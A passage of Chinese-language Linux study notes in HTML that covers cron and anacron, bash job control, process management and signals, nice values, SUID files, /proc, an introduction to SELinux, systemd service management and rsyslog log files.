这个 crontab 是 <code>/usr/bin/crontab</code> 这个可执行文件。</p><p><code>/etc/crontab</code> 是一个文本文件。</p><p>cron 会每分钟去读取一次 <code>/etc/crontab</code> 和 <code>/var/spool/cron</code> 文件。</p><p>由于 cron 是读取到内存当中，所以在修改完 <code>/etc/crontab</code> 这个文件后，可能不会立即执行，这个时候需要重启 crond 服务: <code>sudo systemctl restart crond</code>.</p><h3 id="15-3-3-一些注意事项"><a href="#15-3-3-一些注意事项" class="headerlink" title="15.3.3 一些注意事项"></a>15.3.3 一些注意事项</h3><h2 id="15-4-可唤醒停机期间的工作任务"><a href="#15-4-可唤醒停机期间的工作任务" class="headerlink" title="15.4 可唤醒停机期间的工作任务"></a>15.4 可唤醒停机期间的工作任务</h2><p><code>anacron</code> 命令，执行时间到了但却没有执行的计划任务。也就是说, 过了 crontab 需要执行任务的时间, 但是由于各种原因 crontab 并没有执行, anacron 就会检测到这类没有被执行的任务, 并执行.</p><h3 id="15-4-1-什么是-anacron"><a href="#15-4-1-什么是-anacron" class="headerlink" title="15.4.1 什么是 anacron"></a>15.4.1 什么是 anacron</h3><p>anacron 也是每小时被 crond 执行一次，然后 anacron 再去检测相关的计划任务有没有被执行，如果有超过期限的任务在，就执行该任务，执行完毕或无需执行任何任务时，anacron 就停止。</p><h1 id="第16章-进程管理与-SELinux-初探"><a href="#第16章-进程管理与-SELinux-初探" class="headerlink" title="第16章 进程管理与 SELinux 初探"></a>第16章 进程管理与 SELinux 初探</h1><p>Linux  得程序通常称为 fork-and-exec 的流程。</p><p>进程都会借由父进程以复制 (fork) 的方式产生一个一模一样的子进程，然后被复制出来的子进程再以 exec 的方式执行实际要执行的进程，最终就成为一个子进程。</p><p>常驻在内存当中的进程通常都是负责一些系统所提供的功能以服务用户的各项任务，因此这些常驻程序就被称为: 服务 (daemon).</p><h2 id="16-1-2-Linux-的多人多任务环境"><a href="#16-1-2-Linux-的多人多任务环境" class="headerlink" title="16.1.2 Linux 的多人多任务环境"></a>16.1.2 Linux 的多人多任务环境</h2><p>在 Linux 下执行一个命令时，系统会将相关的权限、属性、进程代码与数据等均加载到内存，并基于这些进程一个进程标识符(PID), 最终该命令可以执行的任务则与这个 PID 的权限有关。</p><h3 id="多重登录环境的七个基本终端界面"><a href="#多重登录环境的七个基本终端界面" class="headerlink" title="多重登录环境的七个基本终端界面"></a>多重登录环境的七个基本终端界面</h3><p>Linux 会默认启动六个终端登录环境的进程。</p><h2 id="16-2-任务管理-job-control"><a href="#16-2-任务管理-job-control" class="headerlink" title="16.2 任务管理 (job control)"></a>16.2 任务管理 (job control)</h2><h3 id="16-2-1-什么是任务管理"><a href="#16-2-1-什么是任务管理" class="headerlink" title="16.2.1 什么是任务管理"></a>16.2.1 什么是任务管理</h3><p>放入后台的任务是不可以用 <code>ctrl + c</code> 终止的。</p><h3 id="16-2-2-job-control-的管理"><a href="#16-2-2-job-control-的管理" class="headerlink" title="16.2.2 job control 的管理"></a>16.2.2 job control 的管理</h3><p>bash 只能够管理自己的任务而不能管理其他 bash 的任务。</p><p>在命令后加上 <code>&amp;</code> 代表将该命令丢到后台中，此时 bash 会给予这个命令一个任务号码 (job number).</p><p>利用数据流重定向处理输出信息:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ tar -zpcvf <span class="hljs-regexp">/tmp/</span>tec.tar.gz <span class="hljs-regexp">/etc &gt; /</span>tmp/log.txt <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br></code></pre></td></tr></table></figure><h4 id="将目前任务丢到后台中暂停-–-ctrl-z"><a href="#将目前任务丢到后台中暂停-–-ctrl-z" class="headerlink" title="将目前任务丢到后台中暂停 – ctrl + z"></a>将目前任务丢到后台中暂停 – ctrl + z</h4><p>默认情况下，使用 [ctrl+z] 丢到后台的程序都是暂停状态。</p><h4 id="查看目前后台任务状态"><a href="#查看目前后台任务状态" class="headerlink" title="查看目前后台任务状态"></a>查看目前后台任务状态</h4><p>使用 <code>jobs</code> 命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">jobs</span> [-lrs]</span><br></code></pre></td></tr></table></figure><p>几个参数:</p><ul><li>-l : 除了列出 job number 与命令串外，同时列出 PID 号码</li><li>-r : 仅列出正在后台 run 的任务</li><li>-s : 仅列出正在后台 stop 的任务<br>使用 <code>jobs -l</code> 后，观察 <code>+</code> <code>-</code> 号，其中 <code>+</code> 代表默认的使用任务，也就是说仅输入 <code>fg</code> 就会被拿到前台中来处理.</li></ul><h4 id="将后台任务拿到前台处理：-fg"><a href="#将后台任务拿到前台处理：-fg" class="headerlink" title="将后台任务拿到前台处理： fg"></a>将后台任务拿到前台处理： fg</h4><p>fg 即 foreground.</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">fg %</span>jobnumber<br></code></pre></td></tr></table></figure><p><code>jobnumber</code> 是任务号码，前面的 <code>%</code> 可有可无。</p><h4 id="让任务在后台下的状态变成运行中-bg"><a href="#让任务在后台下的状态变成运行中-bg" class="headerlink" title="让任务在后台下的状态变成运行中: bg"></a>让任务在后台下的状态变成运行中: bg</h4><p>让 <code>Stopped</code> 的任务变为 <code>Running</code>.</p><h4 id="管理后台当中的任务：kill"><a href="#管理后台当中的任务：kill" class="headerlink" title="管理后台当中的任务：kill"></a>管理后台当中的任务：kill</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">kill</span> <span class="hljs-literal">-signal</span> %jobnumber<br><span class="hljs-variable">$</span> <span class="hljs-built_in">kill</span> <span class="hljs-literal">-l</span><br></code></pre></td></tr></table></figure><p>选项和参数:</p><ul><li>-l : 列出目前 kill 能够使用的信号 (signal) 有哪些</li><li>signal : 代表给予后面接的那个任务什么样的指示，可以用 <code>man 7 signal</code> 查询</li><li>-1 : 重新读取一次参数的配置文件</li><li>-2 : 代表由键盘输入 [ctrl]-c 同样的操作</li><li>-9 : 立即强制删除一个任务</li><li>-15 : 以正常方式终止一项任务</li></ul><h3 id="16-2-3-脱机管理问题"><a href="#16-2-3-脱机管理问题" class="headerlink" title="16.2.3 脱机管理问题"></a>16.2.3 脱机管理问题</h3><p>任务管理中的后台是 bash 的后台，而不是系统的后台。</p><p>使用 <code>nohup</code> 命令, 其可以在脱机或注销系统后，还能够让任务继续执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nohup</span> [命令与参数] &lt;== 在终端前台中的任务</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nohup</span> [命令与参数] &lt;== 在终端后台中的任务</span><br></code></pre></td></tr></table></figure><p><code>nohug</code> 命令并不支持 bash 的内置命令。</p><p>使用 <code>nohug</code> 的信息输出会被重定向到 <code>~/nohup.out</code></p><h2 id="16-3-进程管理"><a href="#16-3-进程管理" class="headerlink" title="16.3 进程管理"></a>16.3 进程管理</h2><h3 id="16-3-1-查看进程"><a href="#16-3-1-查看进程" class="headerlink" title="16.3.1 查看进程"></a>16.3.1 查看进程</h3><p><code>ps</code> 命令的两个常用选项:</p><ul><li><code>ps -l</code> : 查看自己 bash 的进程</li><li><code>ps aux</code> : 查看所有系统运行的进程</li></ul><p>一般来说 <code>ps aux</code> 会按照 PID 的顺序来排序显示。</p><p>如果你发现某个进程的 CMD 后面接上了 <defunct> 时，就代表该进程是僵尸进程。</p><h4 id="top-动态查看进程的变化"><a href="#top-动态查看进程的变化" class="headerlink" title="top : 动态查看进程的变化"></a>top : 动态查看进程的变化</h4><p>使用方式:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">$ <span class="hljs-built_in">top</span> [-d数字] | <span class="hljs-type">top</span> [-bnp]<br></code></pre></td></tr></table></figure><p>参数和选项:</p><ul><li><code>-d</code> : 后面接秒数，就是整个进程界面更新的秒数。默认是5秒</li><li><code>-b</code> : 以批量的方式执行 top, 通常搭配数据流重定向来将批量的结果输出为文件</li><li><code>-n</code> : 与 <code>-b</code> 搭配，表示执行几次 top 的输出结果</li><li><code>-p</code> : 指定某个 PID 来执行查看监测<br><code>top</code> 默认使用 CPU 使用率作为排序依据，可换。</li></ul><h4 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h4><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ pstree <span class="hljs-comment">[-A|U]</span> <span class="hljs-comment">[-up]</span><br></code></pre></td></tr></table></figure><p>选项与参数:</p><ul><li>-A : 各进程树之间的连接以 ASCII 的方式 </li><li>-U : 各进程树之间的连接以 Unicode 的方式 </li><li>-p : 同时列出每个进程的 PID</li><li>-A : 同时列出每个进程的所属账号名称</li></ul><h3 id="16-3-2-进程的管理"><a href="#16-3-2-进程的管理" class="headerlink" title="16.3.2 进程的管理"></a>16.3.2 进程的管理</h3><p>进程的管理是通过给予该进程一个信号 (signal) 去告知该进程你想要让它做什么。</p><p>主要信号的代号、名称及内容:</p><ul><li>1 SIGHUP 启动被终止的进程，可让该 PID 重新读取自己的配置文件</li><li>2 SIGINT 相当于键盘输入 [ctrl]-c 来终止一个进程</li><li>9 SIGKILL 强制中断一个进程的执行</li><li>15 SIGTERM 以正常方式结束进程的方式终止进程</li><li>19 SIGSTOP 相当于键盘输入 [ctrl]-z 来暂停一个进程<br>使用:<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">kill</span> <span class="hljs-literal">-signal</span> PID<br></code></pre></td></tr></table></figure></li></ul><h4 id="通过命令的内容来终止进程-–-killall"><a href="#通过命令的内容来终止进程-–-killall" class="headerlink" title="通过命令的内容来终止进程 – killall"></a>通过命令的内容来终止进程 – killall</h4><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ killall <span class="hljs-comment">[-iIe]</span> <span class="hljs-comment">[-signal]</span> <span class="hljs-comment">[command name]</span><br></code></pre></td></tr></table></figure><p>参数:</p><ul><li><code>-i</code> : interactive, 在删除时会出现提示字符</li><li><code>-I</code> : 忽略大小写</li><li><code>-e</code> : exact, 表示接完整命令，但不能超过 15 个字符, 如 <code>/bin.bash</code> 是完整的，<code>bash</code> 不算完整</li></ul><p>其可以将系统当中所有以某个命令启动的进程全部删除。</p><h3 id="16-3-3-关于进程的执行顺序"><a href="#16-3-3-关于进程的执行顺序" class="headerlink" title="16.3.3 关于进程的执行顺序"></a>16.3.3 关于进程的执行顺序</h3><p>需考虑进程的优先级 (priority) 和 CPU 调度。</p><h4 id="Priority-和-Nice-值"><a href="#Priority-和-Nice-值" class="headerlink" title="Priority 和 Nice 值"></a>Priority 和 Nice 值</h4><p>Linux 给予进程一个优先级 (Priority, PRI), PRI 值越低代表越优先.</p><p>如果要调整进程的优先级，就要通过 nice 值，即 NI.</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PRI <span class="hljs-comment">(new)</span> = PRI <span class="hljs-comment">(old)</span> + <span class="hljs-symbol">NI</span><br></code></pre></td></tr></table></figure><p>注意项:</p><ul><li>nice 值可调整范围为 -20 ~ 19</li><li>root 可随意调整自己或它人的进程的 nice 值，且范围为 -20 ~ 19</li><li>一般用户仅可调整自己进程的 nice 值，且范围为 0 ~ 19</li><li>一般用户仅可将 nice 值调高</li></ul><h4 id="nice-新执行的命令即给予-nice-值"><a href="#nice-新执行的命令即给予-nice-值" class="headerlink" title="nice : 新执行的命令即给予 nice 值"></a>nice : 新执行的命令即给予 nice 值</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nice</span> [-n 数字] <span class="hljs-built_in">command</span></span><br></code></pre></td></tr></table></figure><h4 id="renice-已存在的进程的-nice-重新调整"><a href="#renice-已存在的进程的-nice-重新调整" class="headerlink" title="renice : 已存在的进程的 nice 重新调整"></a>renice : 已存在的进程的 nice 重新调整</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ renice [<span class="hljs-built_in">number</span>] PID<br></code></pre></td></tr></table></figure><h3 id="16-3-4-查看系统资源信息"><a href="#16-3-4-查看系统资源信息" class="headerlink" title="16.3.4 查看系统资源信息"></a>16.3.4 查看系统资源信息</h3><ul><li>free，查看内存使用情况</li><li>uname, 查看系统与内核相关信息</li><li>uptime，查看系统启动时间与任务负载</li><li>netstat，追踪网络或 socket 文件</li><li>dmesg, 分析内核产生的信息</li><li>vmstat, 检测系统资源变化</li></ul><h2 id="16-4-特殊文件与进程"><a href="#16-4-特殊文件与进程" class="headerlink" title="16.4 特殊文件与进程"></a>16.4 特殊文件与进程</h2><h3 id="16-4-1-具有-SUID-x2F-SGID-权限的命令执行状态"><a href="#16-4-1-具有-SUID-x2F-SGID-权限的命令执行状态" class="headerlink" title="16.4.1 具有 SUID&#x2F;SGID 权限的命令执行状态"></a>16.4.1 具有 SUID&#x2F;SGID 权限的命令执行状态</h3><p>SUID 特点:</p><ul><li>SUID 权限仅对二进制程序有效</li><li>执行这对于该程序需要具有 x 的可执行权限</li><li>本权限仅在执行该程序的过程中有效 (run-time)</li><li>执行者将具有该程序拥有者的权限<br>查询整个系统的 SUID&#x2F;SGID 的文件:<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">6000</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="16-4-2-proc-代表的含义"><a href="#16-4-2-proc-代表的含义" class="headerlink" title="16.4.2 /proc/* 代表的含义"></a>16.4.2 <code>/proc/*</code> 代表的含义</h3><p>进程都是在内存中的，而内存中的数据又都是写入到 <code>/proc/*</code> 这个目录下的. 主机上面的各个进程的 PID 都以目录的形式存在于 <code>/proc</code> 中。</p><p><code>/proc</code> 目录下的文件，相关的文件对应相关的内容。</p><h3 id="16-4-3-查询已使用文件或已执行进程使用的文件"><a href="#16-4-3-查询已使用文件或已执行进程使用的文件" class="headerlink" title="16.4.3 查询已使用文件或已执行进程使用的文件"></a>16.4.3 查询已使用文件或已执行进程使用的文件</h3><h4 id="fuser-借由文件-或文件系统-找出正在使用该文件的进程"><a href="#fuser-借由文件-或文件系统-找出正在使用该文件的进程" class="headerlink" title="fuser: 借由文件 (或文件系统) 找出正在使用该文件的进程"></a>fuser: 借由文件 (或文件系统) 找出正在使用该文件的进程</h4><h4 id="lsof-列出被进程所使用的文件名称"><a href="#lsof-列出被进程所使用的文件名称" class="headerlink" title="lsof: 列出被进程所使用的文件名称"></a>lsof: 列出被进程所使用的文件名称</h4><h4 id="pidof-找出某个正在执行的进程的-PID"><a href="#pidof-找出某个正在执行的进程的-PID" class="headerlink" title="pidof: 找出某个正在执行的进程的 PID"></a>pidof: 找出某个正在执行的进程的 PID</h4><h3 id="16-5-SELinux-初探"><a href="#16-5-SELinux-初探" class="headerlink" title="16.5 SELinux 初探"></a>16.5 SELinux 初探</h3><h4 id="16-5-1-什么是-SELinux"><a href="#16-5-1-什么是-SELinux" class="headerlink" title="16.5.1 什么是 SELinux"></a>16.5.1 什么是 SELinux</h4><p>SELinux 是 Security Enhanced Linux 的缩写 </p><h4 id="当初设计的目标：-避免资源误用"><a href="#当初设计的目标：-避免资源误用" class="headerlink" title="当初设计的目标： 避免资源误用"></a>当初设计的目标： 避免资源误用</h4><p>SELinux 是整合到内核的一个模块，更多内容可参考 <a href="https://www.nsa.gov/what-we-do/research/selinux">链接</a></p><p>SELinux 是在进行进程，文件等详细权限配置时依据的一个内核模块。</p><h4 id="传统的文件权限与帐号的关系-自主访问控制"><a href="#传统的文件权限与帐号的关系-自主访问控制" class="headerlink" title="传统的文件权限与帐号的关系: 自主访问控制"></a>传统的文件权限与帐号的关系: 自主访问控制</h4><p>各种权限设置对 root 是无效的.</p><p>DAC, Discretionary Access Control, 自主访问控制, 即，当某个进程想要对文件进行读写时，系统就会根据进程的拥有者和用户组，对比文件的权限，只有通过权限检查，才可以读写文件的方式.</p><h4 id="以策略规则制定进程读取特定文件-强制访问控制-MAC"><a href="#以策略规则制定进程读取特定文件-强制访问控制-MAC" class="headerlink" title="以策略规则制定进程读取特定文件: 强制访问控制 (MAC)"></a>以策略规则制定进程读取特定文件: 强制访问控制 (MAC)</h4><p>MAC, Mandatory Access Control, 强制访问控制。用户的权限根据进程而定，root 所获取的权限也不一定是 root.</p><p>默认情况下，httpd 这个进程仅能在 <code>/var/www/</code> 这个目录下读取文件.</p><h4 id="16-5-2-SELinux-的运行模式"><a href="#16-5-2-SELinux-的运行模式" class="headerlink" title="16.5.2 SELinux 的运行模式"></a>16.5.2 SELinux 的运行模式</h4><ul><li>主体 (subject), SELinux 主要管理的就是进程</li><li>目标 (Object), 主体进程能否读写的目标资源一般就是文件系统.</li><li>策略 (Policy), 这些策略内还会有详细的规则 (rule) 来指定不同的服务是否开放某些资源的读写</li></ul><p>SELinux 的重点是保护进程读取文件系统的权限.</p><h1 id="第17章-认识系统服务-daemon"><a href="#第17章-认识系统服务-daemon" class="headerlink" title="第17章 认识系统服务(daemon)"></a>第17章 认识系统服务(daemon)</h1><h2 id="17-1-什么是-daemon-与服务-service"><a href="#17-1-什么是-daemon-与服务-service" class="headerlink" title="17.1 什么是 daemon 与服务(service)"></a>17.1 什么是 daemon 与服务(service)</h2><p>系统为了某些功能必须提供一些服务，这个服务就叫做 service, 完成 service 的程序叫 daemon. 也就是说, daemon 是程序，service 是功能。</p><p>服务的名称建立之后，在Linux 中使用时，通常在服务的名称后面加上一个 ‘d’, 这个 ‘d’ 代表的就是 daemon 的意思。</p><h3 id="17-1-1-早期-System-V-的-init-管理操作中-daemon-的主要分类-Optional"><a href="#17-1-1-早期-System-V-的-init-管理操作中-daemon-的主要分类-Optional" class="headerlink" title="17.1.1 早期 System V 的 init 管理操作中 daemon 的主要分类(Optional)"></a>17.1.1 早期 System V 的 init 管理操作中 daemon 的主要分类(Optional)</h3><h4 id="服务的启动、关闭与查看等方式"><a href="#服务的启动、关闭与查看等方式" class="headerlink" title="服务的启动、关闭与查看等方式"></a>服务的启动、关闭与查看等方式</h4><p>所有的服务启动脚本放置于 <code>/etc/init.d</code> 目录。</p><p>处理方式:</p><ul><li>启动: <code>/etc/init.d/daemon start</code></li><li>关闭: <code>/etc/init.d/daemon stop</code></li><li>重新启动: <code>/etc/init.d/daemon restart</code></li><li>查看状态: <code>/etc/init.d/daemon status</code></li></ul><h4 id="服务启动的分类"><a href="#服务启动的分类" class="headerlink" title="服务启动的分类"></a>服务启动的分类</h4><h4 id="服务的依赖性问题"><a href="#服务的依赖性问题" class="headerlink" title="服务的依赖性问题"></a>服务的依赖性问题</h4><h4 id="运行级别的分类"><a href="#运行级别的分类" class="headerlink" title="运行级别的分类"></a>运行级别的分类</h4><p>基本上 Linux 提供了7个运行级别, 分别是 0、1、2、3、4、5、6.</p><p>链接文件名(SXXdaemon)的功能为: S 为启动该服务，XX 是数字, 为启动顺序.</p><h4 id="制定运行级别默认要启动的服务"><a href="#制定运行级别默认要启动的服务" class="headerlink" title="制定运行级别默认要启动的服务"></a>制定运行级别默认要启动的服务</h4><p>通过以下命令操作:</p><ul><li>默认要启动: chkconfig daemon on</li><li>默认不启动: chkconfig daemon off </li><li>查看默认为启动与否: chkconfig –list daemon</li></ul><h4 id="运行级别的切换操作"><a href="#运行级别的切换操作" class="headerlink" title="运行级别的切换操作"></a>运行级别的切换操作</h4><p>从命令行界面 (runlevel3) 切换到图形界面 (runlevel5), 只需用 <code>init 5</code> 即可。</p><p>这里的命令行界面就是 tty 界面。Ubuntu 上也可行。</p><h3 id="17-1-2-systemd-使用的-unit-分类"><a href="#17-1-2-systemd-使用的-unit-分类" class="headerlink" title="17.1.2 systemd 使用的 unit 分类"></a>17.1.2 systemd 使用的 unit 分类</h3><p>旧的 init 启动脚本是”一项一项任务依序启动”的模式，速度较慢。</p><p>systemd 让所有服务同时启动。</p><p>systemd 可以兼容 init 的启动脚本，旧的 init 的启动脚本能够通过 systemd 来管理。</p><p>全部的 systemd 都用 systemctl 这个管理程序进行管理，而 systemctl 支持的语法有限制。</p><p>如果某个服务启动是管理员手动执行(即直接输入 daemon)，而不是使用 systemctl, 那么 systemd 将无法检测到该服务，无法进一步管理。</p><h4 id="systemd-的配置文件放置目录"><a href="#systemd-的配置文件放置目录" class="headerlink" title="systemd 的配置文件放置目录"></a>systemd 的配置文件放置目录</h4><p>systemd 将过去 daemon 执行脚本通通称为一个服务单位(unit), 每种服务单位用功能区分.</p><p>配置文件所在目录:</p><ul><li><code>/usr/lib/systemd/system</code>: 每个服务最主要的启动脚本设置</li><li><code>/run/systemd/system</code>: 系统执行过程中产生的服务脚本，其脚本的优先级高于 <code>/usr/lib/systemd/system</code> 中</li><li><code>/etc/systemed/system</code>: 管理员根据主机系统的需求建立的执行脚本，其优先级比 <code>/run/systemd/system</code> 高</li></ul><h4 id="systemd-的-unit-类型分类说明"><a href="#systemd-的-unit-类型分类说明" class="headerlink" title="systemd 的 unit 类型分类说明"></a>systemd 的 unit 类型分类说明</h4><p>通过扩展名判断。</p><h2 id="17-2-通过-systemctl-管理服务"><a href="#17-2-通过-systemctl-管理服务" class="headerlink" title="17.2 通过 systemctl 管理服务"></a>17.2 通过 systemctl 管理服务</h2><p>systemd 只有 systemctl 这个命令来处理。</p><h3 id="17-2-1-通过-systemctl-管理单一服务-service-unit-的启动-x2F-开机启动与查看状态"><a href="#17-2-1-通过-systemctl-管理单一服务-service-unit-的启动-x2F-开机启动与查看状态" class="headerlink" title="17.2.1 通过 systemctl 管理单一服务 (service unit) 的启动&#x2F;开机启动与查看状态"></a>17.2.1 通过 systemctl 管理单一服务 (service unit) 的启动&#x2F;开机启动与查看状态</h3><p>服务的启动一般有两个阶段:</p><ul><li>开机时要不要启动</li><li>现在要不要启动</li></ul><p>systemctl 命令语法:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ systemctl <span class="hljs-comment">[command]</span> <span class="hljs-comment">[unit]</span><br></code></pre></td></tr></table></figure><p><code>[command]</code> 主要有:</p><ul><li>start </li><li>stop</li><li>restart</li><li>enable, 设置下次开机时，后面的 unit 会被启动</li><li>disable</li><li>status</li><li>is-active</li><li>is-enable</li></ul><p>不应该使用 <code>kill</code> 的方式来关闭一个正常的服务。</p><h1 id="第18章-认识与分析日志文件"><a href="#第18章-认识与分析日志文件" class="headerlink" title="第18章 认识与分析日志文件"></a>第18章 认识与分析日志文件</h1><h2 id="18-1-什么是日志文件"><a href="#18-1-什么是日志文件" class="headerlink" title="18.1 什么是日志文件"></a>18.1 什么是日志文件</h2><p>就是记录系统活动信息的几个文件.</p><h4 id="Linux-常见的日志文件名"><a href="#Linux-常见的日志文件名" class="headerlink" title="Linux 常见的日志文件名"></a>Linux 常见的日志文件名</h4><p>日志文件的权限通常是设置为仅有 root 能够读取.</p><p>常见的日志文件有:</p><ul><li>&#x2F;var&#x2F;log&#x2F;boot.log : 只会存储本次开机的信息</li><li>&#x2F;var&#x2F;log&#x2F;cron </li><li>&#x2F;var&#x2F;log&#x2F;dmesg</li><li>&#x2F;var&#x2F;log&#x2F;lastlog</li><li>&#x2F;var&#x2F;log&#x2F;maillog</li><li>&#x2F;var&#x2F;log&#x2F;messages</li><li>&#x2F;var&#x2F;log&#x2F;secure</li><li>&#x2F;var&#x2F;log&#x2F;wtmp, &#x2F;var&#x2F;log&#x2F;failing, 记录正确登录系统者的账户信息与错误登录时所使用的账户信息</li><li>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;<em>, &#x2F;var&#x2F;log&#x2F;samba&#x2F;</em></li></ul><h4 id="日志文件所需相关服务-daemon-与程序"><a href="#日志文件所需相关服务-daemon-与程序" class="headerlink" title="日志文件所需相关服务 (daemon) 与程序"></a>日志文件所需相关服务 (daemon) 与程序</h4><p>日志文件的产生一般有两种方式:</p><ul><li>由软件开发商自行定义写入的日志文件与相关格式, 如 WWW 软件 apache</li><li>另 Linux 发行版提供的日志文件管理服务来统一管理</li></ul><p>可以使用 logrotate 工具来自动化处理日志文件容量与更新. 其将就的日志文件更改名字，然后建立一个空的日志文件，新的日志文件重新开始记录，旧的记录在保存一段时间之后可以自动删除.</p><p>针对日志文件所需的功能，需要的服务与程序有:</p><ul><li>systemd-journald.service, 最主要的信息记录者，由 systemd 提供</li><li>rsyslog.service, 主要收集登录系统与网络等服务的信息</li><li>logrotate, 日志文件的轮循功能</li></ul><p>systemd 有自己的日志文件管理服务 – systemd-journald.service. 其记录主要放在内存中。可以通过 <code>journalctl</code> 以及 <code>systemctl status unit.service</code> 来查看各个不同服务的日志文件.</p><h3 id="18-1-2-日志文件内容的一般格式"><a href="#18-1-2-日志文件内容的一般格式" class="headerlink" title="18.1.2 日志文件内容的一般格式"></a>18.1.2 日志文件内容的一般格式</h3><p>一般来说，系统产生的信息并记录下来的内容，都会记录这些重要内容:</p><ul><li>事件发生的日期与时间</li><li>发生此事件的主机名 </li><li>启动此事件的服务名称或命令与函数名称</li><li>该信息的实际内容<br>这些信息的详细度是可以更改的.</li></ul><h2 id="18-2-rsyslog-service-记录日志文件的服务"><a href="#18-2-rsyslog-service-记录日志文件的服务" class="headerlink" title="18.2 rsyslog.service: 记录日志文件的服务"></a>18.2 rsyslog.service: 记录日志文件的服务</h2><h3 id="18-2-1-rsyslog-service-的配置文件-x2F-etc-x2F-rsyslog-conf"><a href="#18-2-1-rsyslog-service-的配置文件-x2F-etc-x2F-rsyslog-conf" class="headerlink" title="18.2.1 rsyslog.service 的配置文件: &#x2F;etc&#x2F;rsyslog.conf"></a>18.2.1 rsyslog.service 的配置文件: &#x2F;etc&#x2F;rsyslog.conf</h3><p>这个文件规定了:</p><ul><li>什么服务</li><li>什么等级信息</li><li>需要被记录在哪里 (设备或文件)</li></ul><h4 id="服务名称"><a href="#服务名称" class="headerlink" title="服务名称"></a>服务名称</h4><p>rsyslogd 主要还是通过 Linux 内核提供的 syslog 相关规范来设置数据的分类.</p><p>每种服务所产生的数据量差异是很大的.</p><p>Linux 内核的 syslog 支持的服务类型主要有: (可使用 man 3 syslog 查看)</p><ul><li>0, kern</li><li>1, user</li><li>2, mail</li><li><ol start="3"><li>daemon</li></ol></li><li>4, auth</li><li>5, syslog</li><li>6, lpr</li><li>7, news</li><li>8, uucp</li><li>9, cron</li><li>10 authpriv</li><li>11 ftp</li><li>16 ～ 23, local0 ～ local7</li></ul><h4 id="信息等级"><a href="#信息等级" class="headerlink" title="信息等级"></a>信息等级</h4><p>基本上，Linux 内核的 syslog 将信息分为 8 个主要的信息等级，根据 syslog.h 的定义，信息名称与数值的对应如下:</p><ul><li>7 debug</li><li>6 info</li><li>5 notice</li><li>4 warning (warn)</li><li>3 err (error)</li><li>2 crit</li><li>1 alert</li><li>0 emerg (panic)</li></ul><p>等级越靠近 0 则代表系统出现致命问题.</p><p>在信息等级之前还有 <code>[.=!]</code> 链接符号:</p><ul><li><code>.</code> 代表”比后面还要严重的等级(含该等级)都被记录下来”</li><li><code>.=</code> 代表所需要的等级就是后面接的等级</li><li><code>.!</code> 代表不等于，就是除了该等级外的其他等级都记录</li></ul><h4 id="信息记录的文件名或设备或主机"><a href="#信息记录的文件名或设备或主机" class="headerlink" title="信息记录的文件名或设备或主机"></a>信息记录的文件名或设备或主机</h4><p>常见的放置处:</p><ul><li>文件的绝对路径</li><li>打印机或其他</li><li>用户名称</li><li>远程主机</li><li><code>*</code> 代表目前在线的所有人</li></ul><h4 id="服务，daemon-与函数名称"><a href="#服务，daemon-与函数名称" class="headerlink" title="服务，daemon 与函数名称"></a>服务，daemon 与函数名称</h4><p>daemon 是软件.</p><p>service 通常是启动 daemon 的脚本设置.</p><h3 id="18-2-2-日志文件的安全性设置"><a href="#18-2-2-日志文件的安全性设置" class="headerlink" title="18.2.2 日志文件的安全性设置"></a>18.2.2 日志文件的安全性设置</h3><p>rsyslogd 的日志文件只要被编辑过就无法继续记录.</p><p>可以使用 <code>chattr</code> 增加属性来让日志文件仅能被增加而不能被删除.</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">chattr +a /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/admin.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><h3 id="18-2-3-日志文件服务器的设置"><a href="#18-2-3-日志文件服务器的设置" class="headerlink" title="18.2.3 日志文件服务器的设置"></a>18.2.3 日志文件服务器的设置</h3><h2 id="18-3-日志文件的论循-logrotate"><a href="#18-3-日志文件的论循-logrotate" class="headerlink" title="18.3 日志文件的论循 (logrotate)"></a>18.3 日志文件的论循 (logrotate)</h2><h2 